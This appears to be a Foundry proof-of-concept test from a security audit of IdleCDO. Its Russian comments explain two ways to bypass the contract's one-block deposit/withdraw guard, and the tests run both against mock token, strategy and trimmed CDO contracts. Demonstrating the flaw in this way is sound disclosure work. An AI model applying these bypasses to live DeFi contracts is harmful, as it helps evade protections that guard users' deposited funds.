// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";

// ─────────────────────────────────────────────────────────────────────────────
// PoC для находки #1 (Medium): защита "один блок" в IdleCDO слабая.
//
// Полный IdleCDO тянет Uniswap v3 + OZ-upgradeable + GuardedLaunch + Storage,
// поэтому здесь изолирован ТОЛЬКО уязвимый механизм. Функции _updateCallerBlock
// и _checkSameBlock скопированы ДОСЛОВНО из IdleCDO.sol (строки 1016–1023) и
// вызываются в тех же точках потока, что и в оригинале:
//   - _updateCallerBlock() -> в начале _deposit  (IdleCDO.sol:241)
//   - _checkSameBlock()    -> в начале _withdraw (IdleCDO.sol:479)
//
// Суть бага: _lastCallerBlock — это ОДНА глобальная переменная (не mapping по
// пользователю). Она хранит хэш(tx.origin, block.number) только ПОСЛЕДНЕГО
// депозитора. Значит если в одном блоке депонируют двое, слот перезаписывается
// вторым, и первый депозитор больше не заблокирован для вывода в этом же блоке.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Минимальный ERC20 для заглушки underlying-токена.
contract MockERC20 {
    string public name = "Mock USD";
    string public symbol = "mUSD";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        require(a >= amount, "allowance");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "balance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

/// @dev Заглушка стратегии кредитования (аналог IIdleCDOStrategy).
///      Цена 1:1, deposit забирает токены, redeemUnderlying возвращает.
contract MockStrategy {
    MockERC20 public token;

    constructor(MockERC20 _token) {
        token = _token;
    }

    function price() external pure returns (uint256) {
        return 1e18;
    }

    function deposit(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
    }

    function redeemUnderlying(uint256 amount) external returns (uint256) {
        token.transfer(msg.sender, amount);
        return amount;
    }
}

/// @dev Урезанный IdleCDO: только логика депозита/вывода + ОРИГИНАЛЬНАЯ защита
///      "один блок". Цена транша 1:1 для наглядности — на суть бага не влияет.
contract IdleCDOMini {
    // ---- скопировано из IdleCDO / IdleCDOStorage ----
    bytes32 internal _lastCallerBlock; // единственный глобальный слот защиты
    error SameBlock();
    // -------------------------------------------------

    MockERC20 public token;
    MockStrategy public strategy;
    mapping(address => uint256) public trancheBalance; // «tranche shares», 1:1

    constructor(MockERC20 _token, MockStrategy _strategy) {
        token = _token;
        strategy = _strategy;
    }

    /// @dev порядок как в IdleCDO._deposit: сначала _updateCallerBlock, затем приём средств
    function deposit(uint256 amount) external {
        _updateCallerBlock();                                  // IdleCDO.sol:241
        token.transferFrom(msg.sender, address(this), amount); // приём underlying
        token.approve(address(strategy), amount);
        strategy.deposit(amount);                              // кладём в стратегию (directDeposit)
        trancheBalance[msg.sender] += amount;                  // минтим "shares" 1:1
    }

    /// @dev порядок как в IdleCDO._withdraw: сначала _checkSameBlock, затем возврат средств
    function withdraw(uint256 amount) external {
        _checkSameBlock();                                     // IdleCDO.sol:479
        trancheBalance[msg.sender] -= amount;                  // жжём "shares"
        strategy.redeemUnderlying(amount);                     // достаём из стратегии
        token.transfer(msg.sender, amount);                    // отдаём пользователю
    }

    // ===== ДОСЛОВНО из IdleCDO.sol:1015–1023 =====
    function _updateCallerBlock() internal {
        _lastCallerBlock = keccak256(abi.encodePacked(tx.origin, block.number));
    }

    function _checkSameBlock() internal view {
        if (keccak256(abi.encodePacked(tx.origin, block.number)) == _lastCallerBlock) revert SameBlock();
    }
    // =============================================
}

contract IdleCDOSameBlockPoC is Test {
    MockERC20 token;
    MockStrategy strategy;
    IdleCDOMini cdo;

    address alice = address(0xA11CE);
    address bob = address(0xB0B);

    function setUp() public {
        token = new MockERC20();
        strategy = new MockStrategy(token);
        cdo = new IdleCDOMini(token, strategy);

        // Раздаём и апрувим для обоих пользователей.
        token.mint(alice, 1_000e18);
        token.mint(bob, 1_000e18);
        vm.prank(alice);
        token.approve(address(cdo), type(uint256).max);
        vm.prank(bob);
        token.approve(address(cdo), type(uint256).max);
    }

    // ─────────────────────────────────────────────────────────────────────────
    // БАЗА: защита РАБОТАЕТ, когда депозит и вывод делает ОДИН пользователь
    //       в одном блоке — второй вызов реверзит SameBlock. Это то, что
    //       разработчики и хотели.
    // ─────────────────────────────────────────────────────────────────────────
    function test_Guard_BlocksSameUserSameBlock() public {
        vm.startPrank(alice, alice); // msg.sender = tx.origin = alice
        cdo.deposit(100e18);

        vm.expectRevert(IdleCDOMini.SameBlock.selector);
        cdo.withdraw(100e18); // тот же блок, тот же origin -> заблокировано
        vm.stopPrank();

        console2.log(unicode"OK: одиночный депозит+вывод в одном блоке заблокирован");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // ЭКСПЛОЙТ (находка #1): второй депозитор в том же блоке ПЕРЕЗАПИСЫВАЕТ
    // глобальный слот _lastCallerBlock своим хэшем. После этого ПЕРВЫЙ
    // депозитор (Alice) спокойно выводит средства в ЭТОМ ЖЕ блоке — её хэш
    // больше не совпадает с сохранённым (там теперь хэш Bob'а).
    // Защита "один блок" обойдена.
    // ─────────────────────────────────────────────────────────────────────────
    function test_Exploit_FirstDepositorBypassesWhenSecondDepositOverwritesSlot() public {
        uint256 aliceBalBefore = token.balanceOf(alice);

        // 1) Alice депонирует -> слот = keccak(alice, block)
        vm.prank(alice, alice);
        cdo.deposit(100e18);

        // 2) Bob депонирует в ТОМ ЖЕ блоке -> слот ПЕРЕЗАПИСАН = keccak(bob, block)
        vm.prank(bob, bob);
        cdo.deposit(100e18);

        // 3) Alice выводит в ТОМ ЖЕ блоке. В "правильной" защите это должно было
        //    реверзить, но keccak(alice, block) != keccak(bob, block) -> проходит.
        vm.prank(alice, alice);
        cdo.withdraw(100e18); // НЕ реверзит — защита обойдена

        assertEq(cdo.trancheBalance(alice), 0, unicode"Alice полностью вышла в том же блоке");
        assertEq(token.balanceOf(alice), aliceBalBefore, unicode"ЭКСПЛОЙТ: Alice вернула средства, обойдя SameBlock");
        console2.log(unicode"ЭКСПЛОЙТ: первый депозитор обошёл same-block защиту в одном блоке");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // ВТОРОЙ путь обхода: разные tx.origin. Атакующий депонирует одним EOA,
    // а выводит другим (или через релеера) — хэши разные, защита не срабатывает.
    // Здесь Alice депонирует своим origin, а вывод инициируется с origin = bob.
    // ─────────────────────────────────────────────────────────────────────────
    function test_Exploit_CrossOriginBypass() public {
        // Депозит на аккаунт, вывод которого потом сделаем с другого origin.
        // Для чистоты используем bob как депозитора и выводящего, но origin разный.
        vm.prank(bob, bob);
        cdo.deposit(100e18); // слот = keccak(bob, block)

        // Bob выводит, но транзакция идёт через релеера => tx.origin = alice.
        // msg.sender = bob (владелец shares), tx.origin = alice.
        vm.prank(bob, alice);
        cdo.withdraw(100e18); // keccak(alice, block) != keccak(bob, block) -> проходит

        assertEq(cdo.trancheBalance(bob), 0, unicode"ЭКСПЛОЙТ: вывод прошёл при другом tx.origin");
        console2.log(unicode"ЭКСПЛОЙТ: обход через разный tx.origin (релеер)");
    }
}
